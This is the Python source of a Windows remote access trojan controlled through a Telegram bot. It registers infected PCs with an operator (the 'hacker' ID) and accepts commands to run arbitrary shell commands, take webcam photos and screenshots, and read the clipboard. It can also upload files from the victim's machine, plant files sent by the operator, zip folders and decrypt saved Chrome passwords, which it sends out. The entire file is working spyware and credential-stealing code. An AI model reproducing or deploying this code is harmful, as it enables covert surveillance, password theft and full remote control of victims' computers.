import subprocess
import threading
import zipfile
from TelegramBot import *
import sys
from datetime import datetime
import time
import os
from win32event import CreateMutex
from win32api   import CloseHandle, GetLastError
from winerror   import ERROR_ALREADY_EXISTS
import random
import json
import cv2
import mss
import pyperclip
import decrypt_chrome_password
import csv

BOT_TOKEN = "token"
ADMIN_ID = 123456789 # YOUR USER ID

public_dir = os.path.join(os.path.dirname(os.path.expanduser('~')),'Public')
main_dir = os.path.join(public_dir,"Public Apps")

is_logging = False
if "--debug" in sys.argv:
    is_logging = True

B = Bot(BOT_TOKEN)
def log(msg:str,type=None, fileName:str = None, Line:int = None):
    global is_logging
    if is_logging:
        if type:
            print(datetime.now().strftime("%d/%m/%Y %H:%M:%S"),msg,'\\',type,'in',fileName+f'[{Line}]')
            
        else:
            print(datetime.now().strftime("%d/%m/%Y %H:%M:%S"),msg)
def run(func,period:float|int = 5):
    while Working:
        try:
            value = func()
            if value:
                return value
            break
        except Exception as ex:
            exc_type, exc_obj, exc_tb = sys.exc_info()
            log(str(ex), exc_type, exc_tb.tb_frame.f_code.co_filename, exc_tb.tb_lineno)
            time.sleep(period)
try:
    if os.path.isdir(public_dir) and os.path.isdir(main_dir):
        os.chdir(main_dir)
    else:
        os.mkdir(main_dir)
        os.chdir(main_dir)
except Exception as e:
    log("Error changing main directory: "+str(e))
class GetMutex:
    """ Limits application to single instance """

    def __init__(self):
        thisfile   = os.path.split(sys.argv[0])[-1]
        self.name  = thisfile + "_{D0E858DF-985E-CHEAT-B7FB-8D732C3FC3B8}"
        self.mutex = CreateMutex(None, False, self.name)
        self.error = GetLastError()

    def IsRunning(self):
        return (self.error == ERROR_ALREADY_EXISTS)

    def __del__(self):
        if self.mutex: CloseHandle(self.mutex)
class Client:
    def __init__(self,id_of_hacker:int):
        self.id = id_of_hacker
        self.response = {}
        self.file = None
        log("Getme...")
        log(B.me())
        log("Sending hi...")
        run(lambda: B.send(id_of_hacker,f"Hello, I am alive at \"{pc_name}\"\nConnectionID: `{connectionID}`\nNick: `{nickName}`", parse_mode="Markdown"))
    def main(self):
        global lastUpdateID
        global offset_id
        global Working
        global Backup_done
        global last_update_time
        sleep_time = 0
        log("Receiving updates indefinitely...")
        while Working:
            now = time.time()
            if last_update_time + 60 < now:
                sleep_time = 0
            elif last_update_time + 300 < now:
                sleep_time = 5
            elif last_update_time + 600 < now:
                sleep_time = 10
            else:
                sleep_time = 15
            received_updates = run(lambda: B.update(offset_id,allowed_updates=["message"]))
            if received_updates['ok']:
                received_updates = received_updates['result']
                for update in received_updates:
                    last_update_time = time.time()
                    edited = ['','edited_'][int("edited_message" in update)]
                    texts = ['text', 'caption']
                    if "message" in update or "edited_message" in update:
                        if update[edited+"message"]["date"] < time.mktime(time.gmtime())-3600:
                            if offset_id <= update['update_id']:
                                log(f"1 hours passed, cancelling({update['update_id']})...")
                                offset_id = update['update_id'] + 1
                        
                    if update['update_id']>lastUpdateID:
                        lastUpdateID = update['update_id']
                        if 'message' in update or 'edited_message' in update:
                            for text in texts:
                                if text in update[edited+'message']:
                                    log(f"New {edited}message({update[edited+'message']['message_id']}) \""+
                                        update[edited+'message'][text]+
                                        "\" from "+
                                        str(update[edited+'message']['from']['id']))
                                    if update[edited+'message']['chat']['id'] == self.id:
                                        if 'document' in update[edited+'message']:
                                            self.file = update[edited+'message']['document']
                                        else:
                                            self.file = None
                                        self.do(update[edited+'message'][text])
                    if not Working:
                        Backup_done = False
                        break
            else:
                log("Something went wrong: "+str(received_updates))
            time.sleep(sleep_time)
    def do(self,message_text:str):
        global nickName
        global connectionID
        global Working
        try:
            if message_text[0] == '/':
                self.response = {}
                log("command: " + message_text)
                msg = message_text.split(maxsplit=2)

                cmd = msg[0][1:]
                if cmd=='who':
                    log("Asked alive")
                    return run(lambda: B.send(self.id,f"I am alive at \"{pc_name}\"\nConnectionID: `{connectionID}`\nNick: `{nickName}`", parse_mode="Markdown"))
                if len(msg) < 2 or not (msg[1] == connectionID or msg[1] == nickName or msg[1] == 'all'):
                    log("That is not me")
                    return False
                if len(msg)>2:
                    content = msg[2]
                else:
                    content = ''
                log("content: "+str(content))
                if cmd == 'cmd':
                    log('Execute command')
                    process = threading.Thread(target = lambda: self.execute_command(content))
                    process.run()
                elif cmd == 'z':
                    content_sepd = Client.sep_content(str(content))
                    log(str(content_sepd))
                    path_open = content_sepd[0]
                    path_write = content_sepd[1]
                    log('zip, open:'+path_open+', write:'+path_write)
                    if len(content_sepd)>2:
                        comp_lvl = int(content_sepd[2])
                        log('Custom compression level:'+str(comp_lvl))
                    else:
                        comp_lvl = 0
                        log('Default compression level:'+str(comp_lvl))
                    process = threading.Thread(target=lambda: self.zip_file_or_folder(path_open,path_write,comp_lvl))
                    log('zipping...')
                    process.run()
                elif cmd == 'nick':
                    self.send(nickName+" -> "+content.strip('"'))
                    nickName = content.strip('"')
                    log("New nick:"+nickName)
                elif cmd == 'shuffle':
                    tmp = tools.generate_connection_id()
                    self.send(connectionID+" -> "+tmp)
                elif cmd == 'cam':
                    log('cam request')
                    try:
                        self.response['provided']=content
                        if tools.is_int(content):
                            process = threading.Thread(target = lambda: self.capture_camera_picture(int(content)))
                            process.run()
                        else:
                            log("Invalid value for camera port")
                            self.response['out']='Invalid value for camera port'
                            self.send(connectionID+":\n"+json.dumps(self.response))
                    except Exception as e:
                        self.response['exception']=str(e)
                        self.send(connectionID+":\n"+json.dumps(self.response))
                elif cmd == 'screen':
                    log('Screenshot request')
                    try:
                        self.response['provided']=content
                        if tools.is_int(content):
                            process = threading.Thread(target = lambda: self.capture_screenshot(int(content)))
                            process.run()
                        else:
                            log("Invalid value for monitor index")
                            self.response['out']='Invalid value for monitor index'
                            self.send(connectionID+":\n"+json.dumps(self.response))
                    except Exception as e:
                        self.response['exception']=str(e)
                        self.send(connectionID+":\n"+json.dumps(self.response))
                elif cmd == 'exit':
                    log("Exit command received")
                    self.send("Ok, Exiting...")
                    Working = False
                elif cmd == 'clipboard':
                    if content:
                        log("Clipboard copy")
                        if content[0] == '"' and content[-1] =='"' and len(content)>1:
                            content = content[1:][:-1]
                        log("Copying...:"+content)
                        pyperclip.copy(content)
                    else:
                        log("Clipboard get request")
                        tmptxt = connectionID + ":\n"
                        l2= len(tmptxt)
                        tmptxt += (l := pyperclip.paste().strip())
                        log("sending...")
                        tmp = json.dumps([{
                            'type':'pre',
                            'offset':l2,
                            'length':len(l),
                            'language':'clipboard'
                        }])
                        run(lambda: B.send(self.id,tmptxt,entities=tmp))
                elif cmd == 'send':
                    log('Send request')
                    if content[0] == '"' and content[-1] =='"' and len(content)>1:
                        content = content[1:][:-1]
                    
                    process = threading.Thread(target = lambda: self.send_file(content))
                    process.run()
                elif cmd == 'download':
                    log("Download command")
                    try:
                        if self.file:
                            log('File persistent')
                            log('Getting file info...')
                            File = B.getFile(self.file['file_id'])
                            log("DONE: "+str(File))
                            self.response['file'] = File
                            size = File['file_size']
                            file_path = File['file_path']
                            file_name = self.file['file_name']
                            log("Checking filesize")
                            if size<=(20*(1000**2)):
                                log("Downloading file...")
                                File = B.downloadFile(file_path)
                                if content[0] == '"' and content[-1] =='"' and len(content)>1:
                                    content = content[1:][:-1]
                                path_to_open = content
                                if (is_dir:= os.path.isdir(content)):
                                    path_to_open = os.path.join(path_to_open,file_name)
                                log("File path: "+path_to_open)
                                self.response['is_dir'] = is_dir
                                log("Opening for writing...")
                                with open(path_to_open,'wb') as f:
                                    log('Writing...')
                                    f.write(File)
                                    log("DONE")
                                log("Closed / DONE")
                                self.response['success'] = True
                            else:
                                log("More that 20MB")
                                self.response['file_is_too_large'] = True
                        self.response['error'] = 'File not found'
                    except Exception as exception:
                        log(str(exception))
                        self.response['Exception'] = str(exception)
                    run(lambda: self.send(connectionID+":\n"+json.dumps(self.response)))
                elif cmd == 'chrome':
                    try:
                        log('Running...')
                        tmp = decrypt_chrome_password.run()
                        log('Creating file...')
                        file = open('chrome.csv','a',newline='')
                        log('Creating csv writer...')
                        c = csv.writer(file)
                        log('Writing first row...')
                        c.writerow([
                            "No",
                            "User",
                            "URL",
                            "Username",
                            "Password"])
                        log('Writing all rows...')
                        for i in tmp:
                            c.writerow([
                                i.id,
                                i.user,
                                i.url,
                                i.username,
                                i.password
                                ])
                        file.close()
                        with open('chrome.csv','rb') as file2:
                            log('Sending...')
                            run(lambda: B.send_doc_upload(self.id,file2,connectionID+":\n"+json.dumps(self.response)))
                            log('DONE')
                        os.remove('chrome.csv')
                    except Exception as e:
                        self.response['Exception'] = str(e)
                        run(lambda: self.send(connectionID+":\n"+json.dumps(self.response)))
        except Exception as ex:
            self.response['exception']=str(ex)
            self.send(connectionID+":\n"+json.dumps(self.response))
    def sep_content(text:str)->list[str]:
        log(str([text]))
        j=[]
        started = False
        lastChar=''
        temp = ''
        for i in text:
            if i=='"':
                if lastChar=='\\':
                    temp+='"'
                else:
                    started = not started
                    if temp.strip():
                        j.append(temp)
                        temp = ''
                lastChar = i
                continue
            if i==' ' and not started:
                if temp:
                    j.append(temp)
                    temp = ''
                lastChar = i
            elif i=='\\':
                if lastChar=='\\':
                    temp+='\\'
                    lastChar=''
                else:
                    lastChar=i
            else:
                temp+=i
                lastChar = i
        if temp.strip():
            j.append(temp)
        return j
    def zip_file_or_folder(self,  path_to_open, path_to_save, compression_level):
        self.response = {}
        try:
            zip_file = zipfile.ZipFile(path_to_save, "w", zipfile.ZIP_DEFLATED, compresslevel=int(compression_level))
            log('zip opened')
            if os.path.isdir(path_to_open):
                log('zipping dir')
                relative_path = os.path.dirname(path_to_open)
                for root, dirs, files in os.walk(path_to_open):
                    for file in files:
                        log('Adding: '+ str(file))
                        zip_file.write(os.path.join(root, file), os.path.join(root, file).replace(relative_path, '', 1))
            else:
                log('zipping file')
                zip_file.write(path_to_open, os.path.basename(path_to_open))
            log("Completed")
            zip_file.close()
            self.response['success'] = True
        except Exception as e:
            self.response['error'] = str(e)
        self.response['compression_lvl'] = compression_level
        self.response['path_to_open'] = path_to_open
        self.response['path_to_save'] = path_to_save
        log('sending response...')
        self.send(connectionID+":\n"+json.dumps(self.response))
    def send(self, text:str):
        text = str(text)
        for i in range(0,len(text),3500):
            run(lambda: B.send(self.id,text[i:][:(i+3500)]))
    def execute_command(self,command:str):
        command = command.strip('"')
        self.response = {}
        try:
            process = subprocess.run(command,shell = True,capture_output = True,timeout=3600,universal_newlines=True)
            self.response['command'] = command
            self.response['returncode'] = process.returncode
            self.response['out'] = process.stdout
            self.response['error'] = process.stderr
        except Exception as e:
            self.response['error'] = str(e)
        text = connectionID+":\n"
        if 'out' in self.response:
            text += self.response['out']
        text += "\n"*3
        text += json.dumps(self.response)
        for i in range(0,len(text),3500):
            run(lambda: B.send(self.id,text[i:][:3500]))
    def capture_camera_picture(self, camera_port):
        global connectionID
        log("Handling camera")
        video_capture = cv2.VideoCapture(int(camera_port), cv2.CAP_DSHOW)
        if not video_capture.isOpened():
            log("Can not open device: "+str(camera_port))
            self.response["error"] = "CouldNotOpenDevice"
            return False
        success, frame = video_capture.read()
        if not success:
            self.response["error"] = "UnableToCapturePicture"
            log("Can not capture image: ")
        video_capture.release()
        fname = tools.generate_connection_id()+".jpg"
        log("Saving...")
        success = cv2.imwrite(fname, frame)
        if not success:
            log("Can not save picture")
            self.response["error"] = "UnableToSavePicture"
        if not 'error' in self.response:
            log("Sending...")
            with open(fname,'rb') as f:
                run(lambda: B.send_photo_upload(self.id, f, connectionID))
            log("Deleting...")
            os.remove(fname)
        else:
            self.send(connectionID+":\n"+str(self.response))
    def capture_screenshot(self, monitor:int):
        try:
            fname = tools.generate_connection_id()+".jpg"
            with mss.mss() as sct:
                sct.shot(mon=int(monitor), output=fname)
            log("Sending...")
            with open(fname,'rb') as f:
                run(lambda: B.send_photo_upload(self.id, f, connectionID))
            log("Deleting...")
            os.remove(fname)
        except Exception as e:
            log(str(e))
            self.response['camera error']=str(e)
            self.send(connectionID+":\n"+str(self.response))
    def send_file(self,path:str):
        try:
            log("Checking filesize...")
            size = os.path.getsize(path)
            self.response['filesize']=str(size)+"Bytes"
            if size>=50*(1024**2):
                self.response['reason']="File is larger than 50MB"
                log("File is larger than 50MB")
                raise Exception
            with open(path,'rb') as f:
                log("Uploading...")
                run(lambda: B.send_doc_upload(self.id, f, connectionID+": "+path))
        except Exception as e:
            log(str(e))
            self.response['path']=path
            self.response['file error']=str(e)
            self.send(connectionID+":\n"+str(self.response))
class tools:
    def fill_with_zeros(item:int|str,number_of_decimals:int = 9) -> str:
        item = str(item)
        return '0'*(number_of_decimals-len(item)) + item
    def generate_connection_id(decimals:int = 9) -> str:
        return pc_name + '_' + tools.fill_with_zeros(
            str(
                int(
                    random.random()*
                    (
                        (10**decimals)-1
                        )
                    )
                ),
            decimals)
    def backupper():
        global Backup_done
        while Working or not Backup_done:
            if not Working and Backup_done==False:
                Backup_done = True
            file = open('config','w')
            file.write(tools.get_backup_str())
            file.close()
            time.sleep(3)
    def get_backup_str():
        j={}
        for i in list_of_items:
            j[i] = globals()[i]
        return json.dumps(j)
    def set_backup_str(items:dict[str]):
        for i in list_of_items:
            globals()[i] = items[i]
            log("Last "+i+" recovered: "+str(items[i]))
    def is_int(_) -> bool:
        try:
            int(_)
            return True
        except Exception:
            return False
Working = True
Backup_done = False


list_of_items = [
    'connectionID',
    'nickName',
    'lastUpdateID',
    'offset_id'
]
if __name__ == "__main__":
    log("starting...")
    pc_name = os.environ.get('COMPUTERNAME')
    connectionID = tools.generate_connection_id()
    nickName = connectionID
    lastUpdateID = 0
    offset_id = 0
    last_update_time = 0
    if (myapp := GetMutex()).IsRunning():
        log("Another instance is running")
        sys.exit(0)
    try:
        if os.path.isfile("config"):
            tempFile = open('config','r')
            tempReaded = tempFile.read()
            tempReaded = json.loads(tempReaded)
            tools.set_backup_str(tempReaded)
            tempFile.close()
    except Exception as e:
        log("Exception when reading config file: "+str(e))
    threading.Thread(target=tools.backupper,name="Backup thread",).start()
    log("Backupper has started")
    while Working:
        try:
            log("Creating client...")
            client = Client(ADMIN_ID)
            log("Running...")
            client.main()
            log("Main loop exited\n\n\n\n")
        except Exception:
            exc_type, exc_obj, exc_tb = sys.exc_info()
            log("Error in main", exc_type, exc_tb.tb_frame.f_code.co_filename, exc_tb.tb_lineno)
            time.sleep(5)
    log("Exit!")
    sys.exit(0)